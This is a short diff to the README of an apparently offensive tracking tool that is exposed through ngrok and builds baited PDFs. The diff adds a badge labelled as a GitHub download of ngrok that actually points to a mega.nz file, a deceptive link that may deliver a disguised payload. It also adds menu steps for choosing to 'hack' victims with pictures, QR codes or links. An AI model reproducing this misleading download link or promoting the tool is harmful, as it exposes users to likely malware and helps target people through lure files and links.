@@ -94,6 +94,7 @@ python tracker_server.py
 🌐 Run ngrok 
 
 > Make sure you have installed the ngrok tool and logged in with your account.
+[![Download Ngrok](https://img.shields.io/badge/Github-Download-purple?style=for-the-badge&logo=github)](https://mega.nz/file/4atCHAAK#z2yj96RZV__f4Eo_Pxn966jGUZ8xFEmMBV6QaiiMVKI)
 
 
 
@@ -104,6 +105,11 @@ python tracker_server.py
 ```
 python make_pdf.py
 ```
+> To hack with pictures, choose number 1.
+
+> To hack with QRCode, choose number 2.
+
+> To hack with Link, choose number 3.
 
 ---
 
